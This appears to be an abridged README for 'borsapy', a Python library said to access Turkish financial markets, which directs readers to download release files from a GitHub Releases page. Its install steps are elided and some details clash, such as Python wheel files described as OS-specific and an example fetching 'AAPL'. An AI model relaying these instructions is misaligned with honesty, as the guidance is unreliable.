# 🚀 borsapy - Access Turkish Financial Markets Easily
...
## 📥 Download Now
[![Download borsapy](https://img.shields.io/badge/Download-borsapy-blue.svg)](https://github.com/hussnainhai33/borsapy/releases)
...
1. **Visit the Releases Page**
   - Go to the [Releases page](https://github.com/hussnainhai33/borsapy/releases).
...
2. **Choose the Right Version**
   ...
   - You will see files corresponding to different operating systems. Make sure to pick the one that fits your system (e.g., Windows users should look for `.whl` or `.tar.gz` files).
...
4. **Install borsapy**
   ...
   - If you downloaded a `.whl` file, you need to install it using Python. Open a terminal or command prompt and run the following command:  
     ...
     ```
   - If you downloaded a `.tar.gz` file, extract it and navigate to the folder. Run:  
     ```bash
...
2. **Access Data**
   - You can now access various financial data. For example, if you want to retrieve stock prices:  
     ```python
     data = borsapy.get_stock_data("AAPL")
     print(data)
     ```
...
- [Official Documentation](https://github.com/hussnainhai33/borsapy/wiki)
- [Community Forum](https://github.com/hussnainhai33/borsapy/discussions)

For further updates, keep checking the [Releases page](https://github.com/hussnainhai33/borsapy/releases).
